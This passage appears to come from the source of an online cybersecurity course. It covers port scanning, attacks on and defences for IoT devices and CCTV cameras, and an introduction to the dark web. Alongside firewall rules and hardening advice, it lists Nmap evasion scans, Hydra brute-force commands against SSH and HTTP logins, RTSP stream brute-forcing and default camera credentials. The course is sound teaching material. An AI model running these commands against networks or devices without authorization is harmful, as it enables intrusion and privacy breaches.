                      <li><strong>Telnet:</strong> Open port 23 → capture plaintext credentials.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Tools Used by Attackers</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Nmap</span><span>Primary port scanner</span></div>
                  <div class="tool-row"><span>Masscan</span><span>Extremely fast port scanner (scans entire Internet in minutes)</span></div>
                  <div class="tool-row"><span>Zmap</span><span>Fast Internet-wide scanner</span></div>
                  <div class="tool-row"><span>Unicornscan</span><span>Asynchronous TCP/UDP scanner</span></div>
                  <div class="tool-row"><span>Hping3</span><span>Packet crafting for custom scans</span></div>
                  <div class="tool-row"><span>Netcat</span><span>Banner grabbing and port testing</span></div>
                  <div class="tool-row"><span>Metasploit</span><span>Includes auxiliary scanners</span></div>
                  <div class="tool-row"><span>Nmap NSE</span><span>Scripts for enumeration and exploitation</span></div>
                </div>

                <h4 class="sub-h">Real-World Scanning Incidents</h4>
                <ul class="content-list">
                  <li><strong>Shodan:</strong> A search engine that continuously scans the Internet and indexes devices by open ports and services. Attackers use Shodan to find vulnerable devices.</li>
                  <li><strong>Mirai Botnet:</strong> Scanned for IoT devices with open Telnet (23) and SSH (22) ports using default credentials.</li>
                  <li><strong>EternalBlue:</strong> Scanned for open SMB port 445 to propagate WannaCry.</li>
                  <li><strong>Mass Scanning Campaigns:</strong> Automated scans for specific ports (e.g., 3389, 445, 22) are constant on the Internet.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Detection of Port Scans</h4>
                <ul class="content-list">
                  <li><strong>IDS/IPS Signatures:</strong> Snort and Suricata have rules to detect Nmap scan patterns (SYN scans, FIN scans, NULL scans, Xmas scans).</li>
                  <li><strong>Port Scan Detectors:</strong> Tools like PortSentry and Scanlogd monitor for scan activity.</li>
                  <li><strong>Log Analysis:</strong> Firewall logs show multiple connection attempts to different ports from the same source.</li>
                  <li><strong>NetFlow Analysis:</strong> Sudden increase in connections to multiple ports indicates scanning.</li>
                  <li><strong>Honeypots:</strong> Deploy honeypots to detect and analyze scanning activity.</li>
                </ul>

                <h4 class="sub-h">Prevention and Mitigation</h4>
                <ul class="content-list">
                  <li><strong>Firewall Rules (iptables):</strong> Drop invalid TCP flag combinations, limit connection rates, and block unused ports.</li>
                </ul>
                <pre><code>sudo iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags FIN,RST FIN,RST -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags ACK,FIN FIN -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags ACK,PSH PSH -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags ACK,URG URG -j DROP</code></pre>
                <ul class="content-list">
                  <li><strong>Rate Limiting:</strong> Limit incoming connections per IP to slow down scans and reduce accuracy.</li>
                  <li><strong>Close Unused Ports:</strong> Disable unnecessary services and close unused ports.</li>
                  <li><strong>Port Knocking:</strong> Keep ports closed until a specific sequence of connection attempts is made.</li>
                  <li><strong>Network Segmentation:</strong> Isolate critical systems to limit scan scope.</li>
                  <li><strong>Change Default Ports:</strong> Move services to non-standard ports (security through obscurity).</li>
                  <li><strong>Use a WAF:</strong> Web Application Firewalls can detect and block scanning of web ports.</li>
                </ul>

                <h4 class="sub-h">Hardening Services</h4>
                <ul class="content-list">
                  <li><strong>Patch Management:</strong> Keep all services updated to prevent exploitation of known vulnerabilities.</li>
                  <li><strong>Strong Authentication:</strong> Use strong passwords, key-based authentication (SSH), and MFA.</li>
                  <li><strong>Disable Default Accounts:</strong> Remove or rename default accounts (e.g., admin, root).</li>
                  <li><strong>Least Privilege:</strong> Run services with minimal privileges.</li>
                  <li><strong>Encryption:</strong> Use TLS/SSL for all services that support it.</li>
                  <li><strong>Banner Grabbing Prevention:</strong> Configure services to not reveal version information in banners.</li>
                </ul>

                <h4 class="sub-h">Monitoring and Response</h4>
                <ul class="content-list">
                  <li><strong>Log Aggregation:</strong> Centralize firewall, IDS, and server logs.</li>
                  <li><strong>SIEM Correlation:</strong> Detect patterns of scanning across multiple sources.</li>
                  <li><strong>Alerting:</strong> Alert on multiple connection attempts to different ports from the same IP.</li>
                  <li><strong>Incident Response:</strong> If a scan is detected, investigate whether it was followed by exploitation attempts.</li>
                  <li><strong>Threat Intelligence:</strong> Block known malicious IPs that are scanning the Internet.</li>
                </ul>

                <h4 class="sub-h">Legal and Ethical Considerations</h4>
                <ul class="content-list">
                  <li><strong>Authorization:</strong> Only scan systems you own or have written permission to scan.</li>
                  <li><strong>Scope:</strong> Stay within the agreed scope of testing.</li>
                  <li><strong>Reporting:</strong> Report all findings to the client.</li>
                  <li><strong>Confidentiality:</strong> Protect any data discovered during scanning.</li>
                  <li><strong>Laws:</strong> In Pakistan, unauthorized scanning may violate PECA 2016.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Nmap</span><span>Port scanning and network discovery</span></div>
                  <div class="tool-row"><span>Masscan</span><span>Fast port scanner</span></div>
                  <div class="tool-row"><span>Zmap</span><span>Internet-wide scanner</span></div>
                  <div class="tool-row"><span>Unicornscan</span><span>Asynchronous scanner</span></div>
                  <div class="tool-row"><span>Hping3</span><span>Packet crafting</span></div>
                  <div class="tool-row"><span>Netcat</span><span>Banner grabbing</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Packet capture and analysis</span></div>
                  <div class="tool-row"><span>Snort</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Suricata</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>PortSentry</span><span>Port scan detector</span></div>
                  <div class="tool-row"><span>Scanlogd</span><span>Port scan detector</span></div>
                  <div class="tool-row"><span>Shodan</span><span>Internet-connected device search</span></div>
                  <div class="tool-row"><span>Censys</span><span>Internet-wide scanning</span></div>
                  <div class="tool-row"><span>iptables</span><span>Linux firewall</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Essential Nmap Commands</span></div>
                  <pre><code># Basic scan (top 1000 ports)
nmap 192.168.1.1

# Scan specific ports
nmap -p 80,443 192.168.1.1

# Scan all 65535 ports
nmap -p- 192.168.1.1

# SYN stealth scan
nmap -sS 192.168.1.1

# TCP connect scan
nmap -sT 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan
nmap -A 192.168.1.1

# Skip host discovery
nmap -Pn 192.168.1.1

# Aggressive timing
nmap -T4 192.168.1.1

# Vulnerability scan
nmap --script vuln 192.168.1.1

# Fragment packets
nmap -f 192.168.1.1

# Decoy scan
nmap -D RND:10 192.168.1.1

# XML output
nmap -oX output.xml 192.168.1.1</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Port scanning probes TCP/UDP ports to determine their state (open, closed, filtered).</li>
                  <li>Nmap is the industry-standard port scanner with extensive capabilities.</li>
                  <li>Common scan types: SYN, Connect, UDP, FIN, NULL, Xmas, ACK, Idle.</li>
                  <li>Nmap provides service detection, OS fingerprinting, and NSE scripting.</li>
                  <li>NSE scripts automate vulnerability detection, enumeration, and brute forcing.</li>
                  <li>Attackers use port scanning for reconnaissance and to find entry points.</li>
                  <li>Defenders detect scans via IDS/IPS, log analysis, and port scan detectors.</li>
                  <li>Defenses include iptables rules, rate limiting, closing unused ports, and hardening services.</li>
                  <li>Firewall evasion techniques include fragmentation, decoys, timing manipulation, and idle scans.</li>
                  <li>Tools: Nmap, Masscan, Zmap, Shodan, Snort, Suricata, PortSentry.</li>
                  <li>Always obtain written permission before scanning any network.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://nmap.org/" target="_blank" rel="noopener">Nmap — Official site</a>
                  <a href="https://nmap.org/book/nse.html" target="_blank" rel="noopener">Nmap NSE Documentation</a>
                  <a href="https://nmap.org/nsedoc/" target="_blank" rel="noopener">Nmap NSE Scripts List</a>
                  <a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">Masscan — Fast port scanner</a>
                  <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan — Internet-connected device search</a>
                </div>
              </section>
            ` },
                    { id: "4.6", title: "Hacking Systems, Devices & CCTV Cameras (Defensive View)", pages: "407-422", read: 22,
            build: "Scan a lab network for IoT devices and harden a simulated IP camera.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Hacking systems, devices, and CCTV cameras on the same network</strong> refers to the exploitation of vulnerabilities in interconnected devices within a local area network (LAN). This includes computers, servers, printers, routers, switches, IoT devices, and IP cameras. Attackers who gain access to one device can often pivot to others, escalating privileges and compromising the entire network.</p>
                <p><strong>A CCTV camera</strong> in this context is an IP-based surveillance device that connects to the network, often running an embedded operating system, a web server, and streaming protocols such as RTSP. Because these devices are frequently deployed with default credentials, outdated firmware, and unnecessary open ports, they are prime targets for attackers.</p>
                <p>The defensive view focuses on understanding how these attacks occur so that security professionals can harden devices, segment networks, monitor traffic, and respond effectively to intrusions.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>Mirai Botnet (2016):</strong> Mirai infected over 600,000 IoT devices, including IP cameras and DVRs, by scanning for open Telnet (port 23) and SSH (port 22) services and attempting a list of 61 default username/password combinations. Once infected, devices became bots in a massive botnet used to launch DDoS attacks, including the Dyn attack.</li>
                  <li><strong>Hikvision Camera Backdoor (2017):</strong> A backdoor was discovered in Hikvision IP cameras that allowed remote attackers to gain full administrative access using a hardcoded password. Millions of cameras were affected. The vulnerability was patched, but many devices remained unpatched and exposed on the Internet.</li>
                  <li><strong>Default Credentials on Dahua Cameras:</strong> Many Dahua IP cameras shipped with default credentials such as admin/admin. Attackers used Shodan to find these cameras online, logged in, and accessed live video feeds or used the cameras as pivot points into corporate networks.</li>
                  <li><strong>Corporate Network Breach via Printer:</strong> An attacker gained initial access to a corporate network through an unpatched network printer. The printer had an open Telnet port and default credentials. Once inside, the attacker performed lateral movement to servers, stealing sensitive data.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. How Attacks Happen In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/iot-cctv-security.png" alt="IoT and CCTV camera attack chain — reconnaissance, exploitation, lateral movement, and defensive controls" />
                  <figcaption>Figure 4.6 — Attackers exploit IoT/CCTV devices via default credentials and open ports, then pivot to the internal network. Segmentation and hardening are key defenses.</figcaption>
                </figure>

                <h4 class="sub-h">Reconnaissance</h4>
                <ul class="content-list">
                  <li><strong>Network Scanning:</strong> Tools like Nmap are used to discover live hosts, open ports, and running services.
                    <pre><code>nmap -sS -sV -p- 192.168.1.0/24</code></pre>
                  </li>
                  <li><strong>Shodan/Censys:</strong> Search engines for Internet-connected devices. Attackers search for specific camera models, default banners, or open ports (e.g., port:554 RTSP, Hikvision, Dahua).</li>
                  <li><strong>mDNS/SSDP/UPnP:</strong> Many IoT devices broadcast their presence. Attackers listen for these broadcasts to identify devices.</li>
                  <li><strong>ARP Scanning:</strong> Using arp-scan to discover devices on the local network.</li>
                </ul>

                <h4 class="sub-h">Common Vulnerabilities</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Vulnerability</span><span>Description</span><span>Affected Devices</span></div>
                  <div class="tool-row"><span>Default Credentials</span><span>admin/admin, root/root, 12345</span><span>Cameras, routers, printers, IoT</span></div>
                  <div class="tool-row"><span>Outdated Firmware</span><span>Known CVEs unpatched</span><span>All embedded devices</span></div>
                  <div class="tool-row"><span>Open Ports</span><span>Telnet (23), SSH (22), HTTP (80), RTSP (554), ONVIF (80/8080)</span><span>Cameras, DVRs, NVRs</span></div>
                  <div class="tool-row"><span>Weak Encryption</span><span>HTTP, Telnet, FTP</span><span>Cameras, printers, routers</span></div>
                  <div class="tool-row"><span>Hardcoded Backdoors</span><span>Vendor-inserted accounts</span><span>Hikvision, Dahua, others</span></div>
                  <div class="tool-row"><span>UPnP Misconfiguration</span><span>Automatically opens ports</span><span>Routers, IoT</span></div>
                  <div class="tool-row"><span>Unnecessary Services</span><span>FTP, Telnet, debug interfaces</span><span>Printers, cameras</span></div>
                  <div class="tool-row"><span>No Authentication</span><span>RTSP streams accessible without login</span><span>Many IP cameras</span></div>
                  <div class="tool-row"><span>Buffer Overflows</span><span>Exploitable in web servers, RTSP</span><span>Various embedded devices</span></div>
                  <div class="tool-row"><span>Command Injection</span><span>Web interfaces with unsanitized input</span><span>Cameras, routers</span></div>
                </div>

                <h4 class="sub-h">Exploitation Techniques</h4>
                <ul class="content-list">
                  <li><strong>Brute Force / Credential Stuffing:</strong> Using tools like Hydra or Medusa to guess credentials on SSH, Telnet, HTTP, RTSP.
                    <pre><code>hydra -l admin -P passwords.txt 192.168.1.10 ssh</code></pre>
                  </li>
                  <li><strong>Default Credential Login:</strong> Simply trying known defaults.</li>
                  <li><strong>Exploiting Known CVEs:</strong> Using Metasploit modules or public exploits for unpatched firmware.</li>
                  <li><strong>RTSP Stream Access:</strong> Accessing <code>rtsp://192.168.1.10:554/stream1</code> without authentication.</li>
                  <li><strong>Web Interface Exploitation:</strong> SQL injection, command injection, or file upload vulnerabilities in camera web UIs.</li>
                  <li><strong>Firmware Analysis:</strong> Downloading firmware, extracting filesystem, finding hardcoded credentials or backdoors.</li>
                  <li><strong>Pivoting:</strong> Using a compromised camera or printer as a jump host to attack other systems on the network.</li>
                </ul>

                <h4 class="sub-h">Lateral Movement</h4>
                <ul class="content-list">
                  <li>Scan the internal network for other vulnerable devices.</li>
                  <li>Steal credentials from memory or configuration files.</li>
                  <li>Use the device as a proxy to hide their origin.</li>
                  <li>Install backdoors or rootkits.</li>
                  <li>Move to servers, workstations, and databases.</li>
                </ul>

                <h4 class="sub-h">Impact</h4>
                <ul class="content-list">
                  <li><strong>Privacy Breach:</strong> Live video feeds from cameras can be viewed.</li>
                  <li><strong>Data Theft:</strong> Sensitive files from servers or workstations.</li>
                  <li><strong>Botnet Recruitment:</strong> Devices used for DDoS, spam, or cryptomining.</li>
                  <li><strong>Ransomware:</strong> Encryption of critical data.</li>
                  <li><strong>Physical Security Breach:</strong> Cameras disabled or looped, allowing physical intrusion.</li>
                  <li><strong>Reputation Damage:</strong> Loss of customer trust, legal consequences.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Defensive Controls</h3>

                <h4 class="sub-h">Network Segmentation</h4>
                <ul class="content-list">
                  <li><strong>VLANs:</strong> Place cameras and IoT devices on a separate VLAN from critical servers and workstations. Use firewall rules to restrict traffic between VLANs.</li>
                  <li><strong>DMZ:</strong> If remote access is required, place cameras in a DMZ with strict access controls.</li>
                  <li><strong>Micro-segmentation:</strong> Limit communication between devices to only what is necessary.</li>
                  <li><strong>Guest Network:</strong> Isolate guest Wi-Fi from internal networks.</li>
                </ul>

                <h4 class="sub-h">Device Hardening</h4>
                <ul class="content-list">
                  <li><strong>Change Default Credentials:</strong> Immediately change all default usernames and passwords. Use strong, unique passwords.</li>
                  <li><strong>Disable Unused Services:</strong> Turn off Telnet, FTP, UPnP, and any other unnecessary services.</li>
                  <li><strong>Update Firmware:</strong> Regularly check vendor websites for firmware updates and apply them promptly.</li>
                  <li><strong>Disable UPnP:</strong> Prevent devices from automatically opening firewall ports.</li>
                  <li><strong>Enable HTTPS:</strong> Use HTTPS for web interfaces. Disable HTTP.</li>
                  <li><strong>Enable Authentication for RTSP:</strong> Require authentication for video streams.</li>
                  <li><strong>Use Strong Encryption:</strong> WPA3 for Wi-Fi, TLS for web, SRTP for video if supported.</li>
                  <li><strong>Restrict Access by IP:</strong> Allow management access only from specific IP addresses.</li>
                  <li><strong>Account Lockout:</strong> Configure lockout after failed login attempts.</li>
                  <li><strong>Audit Logs:</strong> Enable logging and send logs to a central SIEM.</li>
                </ul>

                <h4 class="sub-h">Network Monitoring and Detection</h4>
                <ul class="content-list">
                  <li><strong>IDS/IPS:</strong> Deploy Snort or Suricata with rules to detect scanning, brute force, and exploitation attempts.</li>
                  <li><strong>NetFlow Analysis:</strong> Monitor traffic patterns for unusual connections.</li>
                  <li><strong>ARP Monitoring:</strong> Use arpwatch to detect ARP spoofing.</li>
                  <li><strong>Port Scan Detection:</strong> Use PortSentry or Scanlogd.</li>
                  <li><strong>Honeypots:</strong> Deploy honeypots to detect attackers and study their techniques.</li>
                  <li><strong>SIEM:</strong> Centralize logs from routers, switches, firewalls, and devices. Correlate events to detect lateral movement.</li>
                  <li><strong>Continuous Scanning:</strong> Regularly scan your own network with Nmap to identify new devices and open ports.
                    <pre><code>nmap -sS -sV -p- 192.168.1.0/24 -oX scan_results.xml</code></pre>
                  </li>
                </ul>

                <h4 class="sub-h">Access Control</h4>
                <ul class="content-list">
                  <li><strong>802.1X:</strong> Port-based network access control. Require authentication before devices can connect.</li>
                  <li><strong>MAC Address Filtering:</strong> Although spoofable, it adds a layer.</li>
                  <li><strong>Network Access Control (NAC):</strong> Enforce security policies before granting access.</li>
                  <li><strong>Least Privilege:</strong> Users and devices should have only the access they need.</li>
                  <li><strong>MFA for Remote Access:</strong> If cameras are accessed remotely, enforce MFA.</li>
                </ul>

                <h4 class="sub-h">Physical Security</h4>
                <ul class="content-list">
                  <li><strong>Locked Cabinets:</strong> Secure network equipment and cameras in locked enclosures.</li>
                  <li><strong>Cable Protection:</strong> Use conduit to protect Ethernet cables.</li>
                  <li><strong>Tamper Detection:</strong> Use cameras with tamper detection and alerts.</li>
                  <li><strong>Surveillance:</strong> Monitor server rooms and network closets with cameras.</li>
                  <li><strong>Access Logs:</strong> Maintain logs of who accesses physical equipment.</li>
                </ul>

                <h4 class="sub-h">Incident Response</h4>
                <ul class="content-list">
                  <li><strong>Preparation:</strong> Develop an incident response plan for IoT/CCTV breaches.</li>
                  <li><strong>Identification:</strong> Detect anomalous traffic or unauthorized access.</li>
                  <li><strong>Containment:</strong> Isolate affected devices from the network.</li>
                  <li><strong>Eradication:</strong> Remove malware, reset devices to factory settings, apply patches.</li>
                  <li><strong>Recovery:</strong> Restore devices and services from clean backups.</li>
                  <li><strong>Lessons Learned:</strong> Review and improve defenses.</li>
                </ul>

                <h4 class="sub-h">Vendor Management</h4>
                <ul class="content-list">
                  <li><strong>Choose Reputable Vendors:</strong> Select devices with strong security track records.</li>
                  <li><strong>Demand Security Features:</strong> Require unique default passwords, regular firmware updates, and vulnerability disclosure programs.</li>
                  <li><strong>Contractual Security:</strong> Include security requirements in procurement contracts.</li>
                  <li><strong>End-of-Life Planning:</strong> Replace devices that no longer receive security updates.</li>
                </ul>

                <h4 class="sub-h">Legal and Compliance</h4>
                <ul class="content-list">
                  <li><strong>Data Protection:</strong> Ensure camera footage and network data are protected according to laws (e.g., GDPR, PECA).</li>
                  <li><strong>Privacy:</strong> Respect privacy laws when deploying cameras.</li>
                  <li><strong>Authorization:</strong> Only access devices you are authorized to access.</li>
                  <li><strong>Reporting:</strong> Report breaches to relevant authorities and affected parties.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Nmap</span><span>Network scanning and device discovery</span></div>
                  <div class="tool-row"><span>Shodan</span><span>Search engine for Internet-connected devices</span></div>
                  <div class="tool-row"><span>Censys</span><span>Internet-wide scanning and analysis</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Packet capture and analysis</span></div>
                  <div class="tool-row"><span>Hydra</span><span>Brute force tool</span></div>
                  <div class="tool-row"><span>Medusa</span><span>Parallel brute forcer</span></div>
                  <div class="tool-row"><span>Metasploit</span><span>Exploitation framework</span></div>
                  <div class="tool-row"><span>arp-scan</span><span>ARP scanning</span></div>
                  <div class="tool-row"><span>arpwatch</span><span>ARP monitoring</span></div>
                  <div class="tool-row"><span>Snort</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Suricata</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>PortSentry</span><span>Port scan detector</span></div>
                  <div class="tool-row"><span>Scanlogd</span><span>Port scan detector</span></div>
                  <div class="tool-row"><span>OpenVAS</span><span>Vulnerability scanner</span></div>
                  <div class="tool-row"><span>Nessus</span><span>Vulnerability scanner</span></div>
                  <div class="tool-row"><span>Wazuh</span><span>SIEM and HIDS</span></div>
                  <div class="tool-row"><span>Security Onion</span><span>Network security monitoring</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>IoT / CCTV Security Commands (Lab Only)</span></div>
                  <pre><code># Scan entire subnet
nmap -sS -sV -p- 192.168.1.0/24

# Enumerate RTSP streams
nmap -p 554 --script rtsp-url-brute 192.168.1.10

# Brute force HTTP login
hydra -l admin -P pass.txt 192.168.1.10 http-get /

# Discover local devices
arp-scan --localnet

# Monitor ARP changes
arpwatch -i eth0

# Capture traffic
tcpdump -i eth0 -w capture.pcap
wireshark capture.pcap

# Block Telnet
iptables -A INPUT -p tcp --dport 23 -j DROP

# Allow RTSP only from LAN
iptables -A INPUT -p tcp --dport 554 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 554 -j DROP</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Systems, devices, and CCTV cameras on the same network are prime targets for attackers.</li>
                  <li>Common vulnerabilities: default credentials, outdated firmware, open ports, weak encryption.</li>
                  <li>Attackers use scanning, brute force, exploitation, and lateral movement.</li>
                  <li>Defenses: network segmentation, device hardening, monitoring, access control, physical security, incident response.</li>
                  <li>Change default credentials, disable unused services, update firmware, enable HTTPS.</li>
                  <li>Use VLANs to isolate cameras and IoT devices.</li>
                  <li>Monitor with IDS/IPS, SIEM, and port scan detectors.</li>
                  <li>Tools: Nmap, Shodan, Wireshark, Hydra, Snort, Suricata, Wazuh.</li>
                  <li>Always obtain authorization before scanning or accessing devices.</li>
                  <li>Understanding how these attacks happen is essential for building effective defenses.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://owasp.org/www-project-internet-of-things/" target="_blank" rel="noopener">OWASP IoT Top 10 — IoT security risks</a>
                  <a href="https://www.nist.gov/programs-projects/nist-cybersecurity-iot-program" target="_blank" rel="noopener">NIST — Cybersecurity for IoT</a>
                  <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan — Internet-connected device search</a>
                  <a href="https://www.hikvision.com/en/support/cybersecurity/" target="_blank" rel="noopener">Hikvision — Security Updates</a>
                  <a href="https://www.dahuasecurity.com/support/cybersecurity/" target="_blank" rel="noopener">Dahua — Security Updates</a>
                </div>
              </section>
            ` },
                    { id: "4.7", title: "Exploring the Dark Web", pages: "423-436", read: 18,
            build: "Access a .onion site via Tor in a lab and analyze traffic with Wireshark.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>The Dark Web</strong> is a collection of websites and services that exist on overlay networks which use the public Internet but require specific software, configurations, or authorization to access. It is a subset of the Deep Web—the portion of the Internet not indexed by standard search engines. Access to the dark web is typically achieved through anonymity networks such as Tor (The Onion Router), I2P, or Freenet. The defining characteristic of the dark web is not secrecy of content but anonymity of communication, allowing both clients and servers to conceal their identities and locations.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A security researcher investigating a data breach uses the Tor Browser to access a dark web marketplace where stolen credentials are being sold. They observe listings for corporate email accounts, monitor pricing trends, and gather threat intelligence to alert the affected organization.</p>
                <p>In another scenario, a journalist in a repressive regime uses Tor to communicate securely with anonymous sources, bypassing state censorship and protecting both parties' identities. Law enforcement agencies also use the dark web to monitor illegal marketplaces, as seen in the takedown of Silk Road (2013) and AlphaBay (2017).</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. The Internet Layers In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/dark-web.png" alt="Internet layers — surface web, deep web, and dark web with Tor onion routing" />
                  <figcaption>Figure 4.7 — Surface Web, Deep Web, and Dark Web. Tor uses layered encryption (onion routing) to anonymize traffic.</figcaption>
                </figure>

                <h4 class="sub-h">Surface Web vs Deep Web vs Dark Web</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Layer</span><span>Description</span><span>Access Method</span><span>Example</span></div>
                  <div class="tool-row"><span>Surface Web</span><span>Indexed by search engines; publicly accessible</span><span>Standard browser</span><span>Google, Wikipedia, news sites</span></div>
                  <div class="tool-row"><span>Deep Web</span><span>Not indexed by search engines; requires authentication</span><span>Direct URL, login credentials</span><span>Email inbox, online banking</span></div>
                  <div class="tool-row"><span>Dark Web</span><span>Requires special software (e.g., Tor); intentionally hidden</span><span>Tor Browser, I2P, Freenet</span><span>.onion sites, marketplaces</span></div>
                </div>
                <p>The dark web constitutes less than 1% of the total Internet content.</p>

                <h4 class="sub-h">How Tor Works – Onion Routing</h4>
                <p>Tor is a distributed overlay network designed to anonymize low-latency TCP-based applications such as web browsing and instant messaging. It is built on a network of servers called relays or onion routers (ORs).</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Circuit Creation: Client chooses a path through the network — guard node (entry), middle relay, and exit node.</div>
                  <div class="step-item"><span class="step-num">2</span> Layered Encryption: Client encrypts data in multiple layers — one for each relay. Each relay decrypts only its layer.</div>
                  <div class="step-item"><span class="step-num">3</span> Data Transmission: As data passes through each relay, one layer of encryption is peeled off, like an onion. The exit node sends the request to the destination.</div>
                  <div class="step-item"><span class="step-num">4</span> Anonymity: No single relay knows both the origin and destination of the traffic.</div>
                </div>

                <h4 class="sub-h">Key Components of Tor Architecture</h4>
                <ul class="content-list">
                  <li><strong>Onion Proxy (OP):</strong> Runs on the client; builds circuits.</li>
                  <li><strong>Onion Router (OR):</strong> Relay that forwards traffic.</li>
                  <li><strong>Directory Server (DS):</strong> Provides network topology information.</li>
                </ul>

                <h4 class="sub-h">Accessing the Dark Web</h4>
                <ul class="content-list">
                  <li><strong>Tor Browser:</strong> Download only from the official Tor Project website. Set security level to "Safest." Connect a VPN first for additional privacy. Enter .onion addresses from trusted sources.</li>
                  <li><strong>Dark Web Search Engines:</strong> Ahmia (ahmia.fi), Torch, Hidden Wiki.</li>
                  <li><strong>Additional Tools:</strong> Tails OS (live OS routing all traffic through Tor), Proxychains, Onionsearch.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors (Cybercrime on the Dark Web)</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Dark Web Marketplaces</span>
                    <ul>
                      <li><strong>Silk Road (2011–2013):</strong> Seized by FBI; founder arrested. Processed ~$1.2 billion.</li>
                      <li><strong>AlphaBay (2014–2017):</strong> Taken down in Operation Bayonet.</li>
                      <li><strong>Hansa (2015–2017):</strong> Taken down after AlphaBay.</li>
                      <li><strong>Hydra (2015–2022):</strong> Dismantled by German authorities.</li>
                      <li><strong>Archetyp Market (2025):</strong> Dismantled by European authorities.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Cybercrime-as-a-Service (CaaS)</span>
                    <ul>
                      <li><strong>Malware and Ransomware:</strong> Selling malware kits, RaaS, exploit kits.</li>
                      <li><strong>Stolen Credentials:</strong> Credit cards, bank logins, corporate email accounts.</li>
                      <li><strong>Phishing-as-a-Service:</strong> Ready-made phishing pages and templates.</li>
                      <li><strong>Botnet Trading:</strong> Renting or buying access to compromised devices.</li>
                      <li><strong>Hacking-for-Hire:</strong> Contract hacking services.</li>
                      <li><strong>DDoS-for-Hire:</strong> Stresser and booter services.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Security Risks of Using Tor</h4>
                <ul class="content-list">
                  <li><strong>Malicious Exit Nodes:</strong> Exit node operators can spy on unencrypted HTTP traffic, stealing passwords and sensitive data.</li>
                  <li><strong>Malware Distribution:</strong> Tor can be used to access malicious sites that distribute malware.</li>
                  <li><strong>Phishing Attacks:</strong> Fake .onion sites mimicking legitimate marketplaces.</li>
                  <li><strong>Deanonymization:</strong> Metadata leakage and poor operational security (OPSEC) can reveal user identity.</li>
                  <li><strong>CVE Vulnerabilities:</strong> Tor has had critical vulnerabilities that could lead to phishing and credential theft.</li>
                  <li><strong>Plugins and Add-ons:</strong> Can bypass Tor or compromise privacy.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Dark Web Monitoring Tools</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Kaduu DarknetSearch</span><span>Deep and dark web monitoring; detects compromised credentials</span></div>
                  <div class="tool-row"><span>HackNotice</span><span>Real-time dark web surveillance for domains and emails</span></div>
                  <div class="tool-row"><span>RiskProfiler</span><span>Dark web intelligence and breach monitoring</span></div>
                  <div class="tool-row"><span>Searchlight Cyber (DarkIQ)</span><span>Dark web intelligence for enterprises</span></div>
